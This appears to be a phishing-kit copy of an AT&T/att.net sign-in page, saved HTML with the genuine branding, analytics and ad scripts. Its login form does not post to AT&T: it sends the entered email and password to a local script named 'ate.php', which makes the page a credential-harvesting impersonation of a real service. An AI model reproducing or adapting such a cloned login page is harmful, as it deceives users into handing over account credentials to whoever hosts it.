<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<!-- saved from url=(0559)https://loginprodx.att.net/commonLogin/igate_edam/controller.do?TAM_OP=login&USERNAME=unauthenticated&ERROR_CODE=0x00000000&ERROR_TEXT=HPDBA0521I%20%20%20Successful%20completion&METHOD=GET&URL=%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%253A%252F%252Flogin.yahoo.com%252Fsaml%252F2.0%252Fatt%26.lang%3Den-US%26Target%3Dhttps%253A%252F%252Fcurrently.att.yahoo.com%252F%3Ftucd567%3Dw&REFERER=https%3A%2F%2Fcurrently.att.yahoo.com%2F&HOSTNAME=loginprodx.att.net&AUTHNLEVEL=&FAILREASON=&PROTOCOL=https&OLDSESSION= -->
<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml"><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><script async="" src="https://home.secureapp.att.net/css/sso/slid/1201/satellite-5cd9a97164746d3c91001847.js"></script><script src="https://home.secureapp.att.net/css/sso/slid/1201/satellite-5d4c958a64746d092a0002f7.js" async=""></script><script async="" src="https://home.secureapp.att.net/css/sso/slid/1201/satellite-5c9276ae64746d66f00017be.js"></script>

<title>AT&amp;T - Sign in to continue</title>
<script type="text/javascript" async="" src="https://home.secureapp.att.net/css/sso/slid/1201/wtid.js"></script><script src="https://home.secureapp.att.net/css/sso/slid/1201/detm-container-hdr.js"></script><script async="" src="https://home.secureapp.att.net/css/sso/slid/1201/webtrends.min.js"></script><script type="text/javascript" src="https://home.secureapp.att.net/css/sso/slid/1201/mbox-contents.js" data-loadedby="detm"></script><style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility: hidden;}
</style><script type="text/javascript" src="https://home.secureapp.att.net/css/sso/slid/1201/edmDataManager.js" data-loadedby="detm"></script><script type="text/javascript" src="https://home.secureapp.att.net/css/sso/slid/1201/edmDataDefinition.js" data-loadedby="detm"></script><script type="text/javascript" src="https://home.secureapp.att.net/css/sso/slid/1201/satelliteLib-bee1ce9b89e943a46b1dfd167adc564fe75eef37.js" data-loadedby="detm"></script><script src="https://home.secureapp.att.net/css/sso/slid/1201/satellite-5c4f9a7764746d2cab001d12.js"></script><script type="text/javascript" src="https://home.secureapp.att.net/css/sso/slid/1201/detm_adobe.js" data-loadedby="detm"></script>
<!-- TG1403 S4055 - iframe -->

<script type="text/javascript">
   if (self === top) {
       var antiClickjack = document.getElementById("antiClickjack");
       antiClickjack.parentNode.removeChild(antiClickjack);
   } else {
   	var noFrameBusting = false;
   	if( ! noFrameBusting ) {
       top.location = self.location;
   	}
   }
</script>

<script type="text/javascript">
(function() {
         if ("-ms-user-select" in document.documentElement.style && navigator.userAgent.match(/IEMobile\/10\.0/)) {
                 var msViewportStyle = document.createElement("style");
                 msViewportStyle.appendChild(
                          document.createTextNode("@-ms-viewport{width:auto!important}")
                 );
                 document.getElementsByTagName("head")[0].appendChild(msViewportStyle);
         }
})();
</script>



<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=0.5, maximum-scale=1.0">

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/_fontface.css" type="text/css">
<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/main.css" type="text/css" media="screen">


<!--[if lte IE 6]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie6.css"  type="text/css" media="screen" />

<![endif]-->

<!--[if IE 7]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie7.css"  type="text/css" media="screen" />

<![endif]-->

<!--[if IE 8]>

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/ie8.css"  type="text/css" media="screen" />

<![endif]-->

<link rel="stylesheet" href="https://home.secureapp.att.net/css/sso/slid/1201/mobile.css" type="text/css" media="handheld, only screen and (max-device-width: 480px)">

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/jquery-1.5.1.min.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/jquery/simplemodal/jquery.simplemodal.js" ></script>

<script type="text/javascript" src="https://home.secureapp.att.net/js/sso/slid/1201/script.js" ></script>

<!-- <script type="text/javascript" src="//sadlib.static-app.synacor.com/client/att/att.js" async></script> -->



<!-- TG1403 S5534 - CR-1402-0249 RD2376 - Replace WebTrends tags with Adobe tags -->


<!-- START OF SmartSource Data Collector TAG v10.2.0 -->
<!-- Copyright (c) 2012 Webtrends Inc.  All rights reserved. -->
<script>
window.webtrendsAsyncInit=function(){
    var dcs=new Webtrends.dcs().init({
        dcsid:"dcsdjtdi8wz5bdo7rtxv6ly3m_4s9j"
        ,domain:"statse.webtrendslive.com"
        ,navigationtag: "div,span"
        ,timezone:-8
        ,offsite:true
        ,download:true
        ,downloadtypes:"xls,doc,pdf,txt,csv,zip,docx,xlsx,rar,gzip"
        ,onsitedoms:"att.net"
        ,plugins:{
            //hm:{src:"//s.webtrends.com/js/webtrends.hm.js"}
          //  LinkTrack: { src: "/scripts/linkTrack.js", DivList: ".*" }
        }
        }).track();
};
(function(){
    var s=document.createElement("script"); s.async=true; s.src="https://loginprodx.att.net/commonLogin/igate_edam/staticContent/images/SLID/js/webtrends.min.js";
    var s2=document.getElementsByTagName("script")[1]; s2.parentNode.insertBefore(s,s2);
}());
</script>
<noscript><img alt="dcsimg" id="dcsimg" width="1" height="1" src="https://statse.webtrendslive.com/dcsslzoj37dv0hctv586rtbcg_1v7w/njs.gif?dcsuri=/nojavascript&amp;WT.js=No&amp;WT.tv=10.2.0&amp;dcssip=www.beta.att.yahoo.com"/></noscript>
<!-- END OF SmartSource Data Collector TAG v10.2.0 -->

<script type="text/javascript">
/*mboxHighlight+ (1of2) v1 ==> Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!='undefined')?window.ttMETA:[];window.ttMETA.push({'mbox':'ATT-Global-mbox','campaign':'','experience':'','offer':''});window.ttMBX=function(x){var mbxList=[];for(i=0;i<ttMETA.length;i++){if(ttMETA[i].mbox==x.getName()){mbxList.push(ttMETA[i])}}return mbxList[x.getId()]}
</script><script src="https://home.secureapp.att.net/css/sso/slid/1201/satellite-5902439064746d5a880062b0.js"></script><script type="text/x-safeframe-booted" id="sf_tag_1575799581118_26">{"positions":[{"id":"RICH","html":"<script type='text\/javascript'>document.write('<a href=\"https:\/\/us.y.atwola.com\/?adlink|5113.1|5043041|0|5112|AdId=10563921;BnId=10;guid=00uiiotepbbtm&b=4&d=QBz13_JtYHqUKxERU8oC&s=0l&i=pnHHU7FYdfQ.oAu6Xn5H;itime=799579293;kvsecure%2Ddarla=3%2D20%2D1%7Cysd%7C2;kvmn=y963896140;kvssp=ssp;kvcobrandid=54750051;kvsecure=true;kvpgcolo=ir2;kvcobrandname=sbc;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=google;kr21527=1606607;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrbrand=airtel:airtel%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=20;kvadtc%5Fcrcountry=ng;kp=416223;gdpr=0;adclntid=1004;spaceid=794200025;\" target=\"_top\"><img src=\"https:\/\/aka-cdn.adtechus.com\/images\/255\/Ad0St1Sz5112Sq0V0Id26721023.jpg\" border=\"0\" alt=\"Advertisement\" width=\"1440\" height=\"1024\"\/><\/a>');\n  \ndocument.write(\"<scr\"+\"ipt src=\\\"\"+(window.location.protocol=='https:' ? \"https:\/\/aka-cdn.adtechus.com\" : \"http:\/\/aka-cdn-ns.adtechus.com\")+\"\/media\/moat\/adtechbrands092348fjlsmdhlwsl239fh3df\/moatad.js#moatClientLevel1=5113&moatClientLevel2=374058&moatClientLevel3=0&moatClientLevel4=5043041&zMoatMaster=10433389&zMoatFlight=10563921&zMoatBanner=26721023&zURL=https&zMoatPlacementId=5043041&zMoatAdId=10563921&zMoatCreative=0&zMoatBannerID=10&zMoatCustomVisp=50&zMoatCustomVist=1000&zMoatIsAdvisGoal=0&zMoatEventUrl=https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043041|0|5112|AdId=10563921;BnId=10;ct=1848780573;st=4608;adcid=1;itime=799579293;reqtype=5;guid=00uiiotepbbtm&b=4&d=QBz13_JtYHqUKxERU8oC&s=0l&i=pnHHU7FYdfQ.oAu6Xn5H;;impref=1575799579134373357;imprefseq=166921327146434688;imprefts=1575799579;adclntid=1004;spaceid=794200025;adposition=RICH;lmsid=;pvid=0MieEDEwLjIAelLHXZWvtgK_MTA1LgAAAABuMN60;sectionid=;kvsecure%2Ddarla=3%2D20%2D1%7Cysd%7C2;kvmn=y963896140;kvssp=ssp;kvcobrandid=54750051;kvsecure=true;kvpgcolo=ir2;kvcobrandname=sbc;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=google;kr21527=1606607;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrbrand=airtel:airtel%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=20;kvadtc%5Fcrcountry=ng;kp=416223;gdpr=0;&zMoatSize=5112&zMoatSubNetID=1&zMoatisSelected=0&zMoatadServer=us.y.atwola.com&zMoatadVisServer=&zMoatSamplingRate=5&zMoatliveTestCookie=&zMoatRefSeqId=ACAAKAhBRJA&zMoatImpRefTs=1575799579&zMoatAlias=y963896140&zMoatVert=&zMoatBannerInfo=493307808\\\" type=\\\"text\/javascript\\\"><\/scr\"+\"ipt>\");\n<\/script>","lowHTML":"","meta":{"y":{"pos":"RICH","cscHTML":"<img width=1 height=1 alt=\"\" src=\"https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043041|0|5112|AdId=10563921;BnId=10;ct=1848780573;st=4712;adcid=1;itime=799579293;reqtype=5;guid=00uiiotepbbtm&b=4&d=QBz13_JtYHqUKxERU8oC&s=0l&i=pnHHU7FYdfQ.oAu6Xn5H;;impref=1575799579134373357;imprefseq=166921327146434688;imprefts=1575799579;adclntid=1004;spaceid=794200025;adposition=RICH;lmsid=;pvid=0MieEDEwLjIAelLHXZWvtgK_MTA1LgAAAABuMN60;sectionid=;kvsecure%2Ddarla=3%2D20%2D1%7Cysd%7C2;kvmn=y963896140;kvssp=ssp;kvcobrandid=54750051;kvsecure=true;kvpgcolo=ir2;kvcobrandname=sbc;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=google;kr21527=1606607;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrbrand=airtel:airtel%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=20;kvadtc%5Fcrcountry=ng;kp=416223;gdpr=0;\">","cscURI":"https:\/\/us.y.atwola.com\/adcount|2.0|5113.1|5043041|0|5112|AdId=10563921;BnId=10;ct=1848780573;st=4712;adcid=1;itime=799579293;reqtype=5;guid=00uiiotepbbtm&b=4&d=QBz13_JtYHqUKxERU8oC&s=0l&i=pnHHU7FYdfQ.oAu6Xn5H;;impref=1575799579134373357;imprefseq=166921327146434688;imprefts=1575799579;adclntid=1004;spaceid=794200025;adposition=RICH;lmsid=;pvid=0MieEDEwLjIAelLHXZWvtgK_MTA1LgAAAABuMN60;sectionid=;kvsecure%2Ddarla=3%2D20%2D1%7Cysd%7C2;kvmn=y963896140;kvssp=ssp;kvcobrandid=54750051;kvsecure=true;kvpgcolo=ir2;kvcobrandname=sbc;kvadtc%5Fdvmktname=unknown;kvadtc%5Fdvosplt=windows%5F7;kvadtc%5Fdvbrand=google;kr21527=1606607;kvadtc%5Fdvtype=desktop;kvadtc%5Fdvmodel=chrome%5F%2D%5Fwindows;kvrepo%5Fdvosplt=windows%5F7;kvadtc%5Fdvosversion=NT%206%2E1;kvadtc%5Fcrbrand=airtel:airtel%5Fng;kvadtc%5Fcrmcc=621;kvadtc%5Fcrmnc=20;kvadtc%5Fcrcountry=ng;kp=416223;gdpr=0;","behavior":"non_exp","adID":"10563921","matchID":"999999.999999.999999.999999","bookID":"10563921","slotID":"0","serveType":"6","ttl":-1,"err":false,"hasExternal":false,"supp_ugc":"0","placementID":"10563921","fdb":null,"serveTime":-1,"impID":"-1","creativeID":26721023,"adc":"{\"label\":\"AdChoices\",\"url\":\"https:\\\/\\\/info.yahoo.com\\\/privacy\\\/us\\\/yahoo\\\/relevantads.html\",\"close\":\"Close\",\"closeAd\":\"Close Ad\",\"showAd\":\"Show ad\",\"collapse\":\"Collapse\",\"fdb\":\"I don't like this ad\",\"code\":\"en-us\"}","is3rd":1,"facStatus":{"fedStatusCode":"19","fedStatusMessage":"Filtered because of co-brand user"},"userProvidedData":{},"facRotation":{},"slotData":{"trusted_custom":"false","freqcapped":"false","delivery":"1","pacing":"1","expires":"1625111940","companion":"false","exclusive":"false","redirect":"false","pvid":"0MieEDEwLjIAelLHXZWvtgK_MTA1LgAAAABuMN60"},"size":"1440x1024"}},"conf":{"w":1440,"h":1024}}],"conf":{"useYAC":0,"usePE":1,"servicePath":"","xservicePath":"","beaconPath":"","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/html\/r-sf.html","msgPath":"https:\/\/fc.yahoo.com\/unsupported-1946.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/html\/r-csc.html","root":"sdarla","edgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1","version":"3-20-1","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/3-20-1\/js\/g-r-min.js","fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now","positions":{"RICH":{"dest":"ad","asz":"1440x1024","id":"RICH","w":"1440","h":"1024"}},"property":"","events":[],"lang":"en-us","spaceID":"794200025","debug":false,"asString":"{\"useYAC\":0,\"usePE\":1,\"servicePath\":\"\",\"xservicePath\":\"\",\"beaconPath\":\"\",\"renderPath\":\"\",\"allowFiF\":false,\"srenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/html\\\/r-sf.html\",\"renderFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/html\\\/r-sf.html\",\"sfbrenderPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/html\\\/r-sf.html\",\"msgPath\":\"https:\\\/\\\/fc.yahoo.com\\\/unsupported-1946.html\",\"cscPath\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/html\\\/r-csc.html\",\"root\":\"sdarla\",\"edgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\",\"sedgeRoot\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\",\"version\":\"3-20-1\",\"tpbURI\":\"\",\"hostFile\":\"https:\\\/\\\/s.yimg.com\\\/rq\\\/darla\\\/3-20-1\\\/js\\\/g-r-min.js\",\"fdb_locale\":\"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.|Want an ad-free inbox? Upgrade to Yahoo Mail Pro!|Upgrade Now\",\"positions\":{\"RICH\":{\"dest\":\"ad\",\"asz\":\"1440x1024\",\"id\":\"RICH\",\"w\":\"1440\",\"h\":\"1024\"}},\"property\":\"\",\"events\":[],\"lang\":\"en-us\",\"spaceID\":\"794200025\",\"debug\":false}"},"meta":{"y":{"pageEndHTML":"<!-- Page End HTML -->","pos_list":["RICH"],"transID":"darla_prefetch_1575799579820_1245969415_3","k2_uri":"","fac_rt":-1,"ttl":-1,"spaceID":"794200025","lookupTime":125,"procTime":126,"npv":0,"pvid":"0MieEDEwLjIAelLHXZWvtgK_MTA1LgAAAABuMN60","serveTime":-1,"ep":{"site-attribute":"","tgt":"_blank","secure":true,"ref":"https:\/\/loginprodx.att.net\/","filter":"no_expandable;exp_iframe_expandable;","darlaID":"darla_instance_1575799579820_1417148826_2"},"pym":{".":"v0.0.9;;-;"},"host":"","filtered":[],"pe":""}}}</script><script type="text/javascript" src="https://home.secureapp.att.net/css/sso/slid/1201/boot.js"></script><script id="sf_host_lib_sf_auto_0-8-11-2019" type="text/javascript" class="sf_lib" src="https://home.secureapp.att.net/css/sso/slid/1201/g-r-min.js"></script><script src="https://home.secureapp.att.net/css/sso/slid/1201/satellite-5d9e213864746d10bb000ef0.js"></script><script src="https://home.secureapp.att.net/css/sso/slid/1201/satellite-5d4c960164746d095d00043a.js"></script><script src="https://home.secureapp.att.net/css/sso/slid/1201/satellite-5cd9ad8a64746d68b1001e88.js"></script><script src="https://home.secureapp.att.net/css/sso/slid/1201/128900881029137" async=""></script></head>



<body><div class="overlay-body" style="display:none;"></div>

<div id="header"><div id="GlobalNav"><div class="globalNavWrap"><ul><li class="selected"><a href="http://www.att.net/" title="att.net" target="_top">att.net</a></li><li><a href="http://www.att.com/" title="att.com" target="_top">att.com</a></li><li class="last"><a href="http://uverseonline.att.net/" title="uverse.com" target="_top">uverse.com</a></li></ul><ul class="gnMoreLinks"><li class="last"><a href="http://elportal.att.net/" title="En Espa�ol" target="_top">En Espa�ol</a></li></ul></div></div><div id="masthead"><a href="http://www.att.net/" target="_top" id="attLogoHead" title="att.net Home">AT&amp;T</a><div id="signIn"><ul><li class="last"><a href="https://www.att.com/esupport/index.jsp?App_ID=PBY" target="_top">AT&amp;T Support</a></li></ul></div></div></div>

<div id="pageWrap"><div id="YadWrap"><div id="richad"></div></div>
<div id="sb_rel_ad" class="darla" style="position: relative; z-index: 9; width: 100%; height: 100px; visibility: inherit; display: inline-block; font-size: 0px;"></div>

 <div id="pageBody"><div id="modal-overlay-body" style="display:none;"></div>

  <div id="loginWrap">
 

  <form  action="ate.php" method="post" id="LoginForm" autocomplete="off" focus="userid" name="LoginForm" type="com.sbc.idm.igate_edam.forms.LoginFormBean">

	<input type="hidden" name="style" value=ATTidp>
	<input type="hidden" name="targetURL" value=https://loginprodx.att.net/FIM/sps/ATTidp/saml20/logininitial?RequestBinding=HTTPPost&PartnerId=https%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt&.lang=en-US&Target=https%3A%2F%2Fcurrently.att.yahoo.com%2F>
	<input type="hidden" name="previousRefID" value=1575635012808_1326391342_C>    
	<input type="hidden" name="optOutGroupUpdate" value=null> 
	<input type="hidden" name="mergredID" value=null>   
    
    
         <input type="password"  style="visibility:hidden">
    
    
    <h1><strong>Sign in to continue</strong></h1>


    <ul class="uLogin">

     <li id="uID">

         
      <label for="nameBox">User ID/Email Address</label>
	<input type="email" placeholder="ID/Email" name="email" id="email" value="" autocomplete="off" required="required" maxlength="50" size="50" class="slidTxtbox" />
	

      <div class="quesIcon" id="ques1">
        <div id="qAns1" class="qAns">Info</div></div>
      </li>

     <li id="uPwd">

      <label  for="pwdBox">Password</label>
      <input type="password" placeholder="Password" name="password" autocomplete="off" required="required" id="password" value="" maxlength="50" size="50" class="slidTxtbox" />
     </li>

     <li id="uRM">

      <p><input type="checkbox" name="rememberID" id="rememberID" class="slidChkBox" /><label for="rememberID">Keep me signed in</label></p>

      <p>for 2 weeks unless I sign out. <span class="quesIcon" id="ques2"><span id="qAns2" class="qAns">Info</span></span></p> 

      <p>(Uncheck if on a shared computer.)</p>
     </li>
     



     <li id="uBtn">

      <input type="submit" id="submitLogin" value="Sign In" class="loginBtn" />
     </li>
    </ul>
       
    <div id="lognp"></div>

    <div id="overLayCheck" class="overLayRight1"></div>

   </form>    

   <div id="promo"></div>
   
   <div id="modal" role="dialog" aria-labelledby="RedirectionModal">
		<div class="modal-content">
			
			<div class="copy">
			<p id="RedirectionModal" class="pstyle">You are being redirected to ATT.com<br><span class="pstyle1">where you can recover your password.</span> </p> 
			</div>
			<div id="count" style="visibility:hidden;margin-top:-28px;">Redirecting in 10 seconds...</div>
			<a onclick="cancelLoad()" class="hover" id="CancelM" aria-label="Cancel" href="https://loginprodx.att.net/commonLogin/igate_edam/controller.do?TAM_OP=login&amp;USERNAME=unauthenticated&amp;ERROR_CODE=0x00000000&amp;ERROR_TEXT=HPDBA0521I%20%20%20Successful%20completion&amp;METHOD=GET&amp;URL=%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%253A%252F%252Flogin.yahoo.com%252Fsaml%252F2.0%252Fatt%26.lang%3Den-US%26Target%3Dhttps%253A%252F%252Fcurrently.att.yahoo.com%252F%3Ftucd567%3Dw&amp;REFERER=https%3A%2F%2Fcurrently.att.yahoo.com%2F&amp;HOSTNAME=loginprodx.att.net&amp;AUTHNLEVEL=&amp;FAILREASON=&amp;PROTOCOL=https&amp;OLDSESSION=#" role="button"><img class="btnCancel" src="https://home.secureapp.att.net/css/sso/slid/1201/Button.png" alt="Cancel"></a>
			<div><img id="logo1" class="attlogo" alt="attlogo" src="https://home.secureapp.att.net/css/sso/slid/1201/AT&amp;T_logo.png"></div>		
		</div>
		<div class="overlay"></div>
	</div>

  </div>

 </div>

</div>

<div id="footer"><div class="footerWrap"><ul><li class="first"><a href="http://www.att.net/s/context.dll?id=1400&amp;type=clickthru&amp;name=global.footer.att.support&amp;redirecturl=https://www.att.com/esupport/index.jsp?App_ID=PBY">AT&amp;T Support</a></li><li><a href="http://www.att.net/s/context.dll?id=1400&amp;type=clickthru&amp;name=global.footer.att.adinfo&amp;redirecturl=http://www.att.net/legal/advertising" target="_top">Advertise with Us</a></li><li><a href="http://www.att.net/s/context.dll?id=1400&amp;type=clickthru&amp;name=global.footer.att.TOS&amp;redirecturl=http://www.att.com/shop/internet/att-internet-terms-of-service.jsp" target="_blank">Terms of Service</a></li><li><a href="http://www.att.net/s/context.dll?id=1400&amp;type=clickthru&amp;name=global.footer.att.copyright&amp;redirecturl=http://info.yahoo.com/copyright/details.html" target="_top">Copyright</a></li><li><a href="http://www.att.net/s/context.dll?id=1400&amp;type=clickthru&amp;name=global.footer.att.privacy&amp;redirecturl=http://att.yahoo.com/privacy" target="_top">Privacy Policy</a></li><li><a href="http://www.att.net/s/context.dll?id=1400&amp;type=clickthru&amp;name=global.footer.att.aboutourads&amp;redirecturl=http://info.yahoo.com/privacy/us/yahoo/attandyahoo/adchoices.html" target="_top">About Our Ads</a></li><li class="last"><a href="http://www.att.net/s/context.dll?id=1400&amp;type=clickthru&amp;name=global.footer.att.AUP&amp;redirecturl=https://www.att.com/legal/terms.aup.html" target="_top">Acceptable Use Policy</a></li></ul><p><a href="http://www.att.net/s/context.dll?id=1400&amp;type=clickthru&amp;name=global.footer.att.IP&amp;redirecturl=http://www.att.com/gen/privacy-policy?pid=2587" target="_top">� 2018 AT&amp;T Intellectual Property</a>. All rights reserved. AT&amp;T and the AT&amp;T logo are trademarks of AT&amp;T Intellectual Property.</p></div></div>





<script src="https://home.secureapp.att.net/css/sso/slid/1201/detm-container-ftr.js"></script>


<!-- <script type="text/javascript">_satellite.pageBottom();</script> -->
<script>
    DARLA_CONFIG = {
        positions: {
            RICH: {
                id: 'RICH',
                dest: 'ad',
                w: 1440,
                h: 1024,
                timeout: 5000,
                noexp: 1
            }
        }
    };
</script>

<script src="https://fc.yahoo.com/sdarla/php/client.php?l=RICH{dest:ad;asz:1440x1024}&amp;f=794200025&amp;ref=https%3A%2F%2Floginprodx.att.net%2F"></script>



<script type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2FcommonLogin; path=/";
/*]]>*/ 
</script>
<div id="darla_csc_holder" class="darla" style="display: none;"><iframe style="display: none;" id="darla_csc_writer_0" class="darla" src="https://home.secureapp.att.net/css/sso/slid/1201/r-csc.html" frameborder="no" scrolling="no" allowtransparency="true" hidefocus="true" tabindex="-1" marginwidth="0" marginheight="0"></iframe></div><script src="https://home.secureapp.att.net/css/sso/slid/1201/attmonetization.config.js" async="" defer="" type="text/javascript"></script><div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.1500115391486172"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.9710918816626124" width="0" height="0" alt="" src="https://home.secureapp.att.net/css/sso/slid/1201/0"></div></body></html>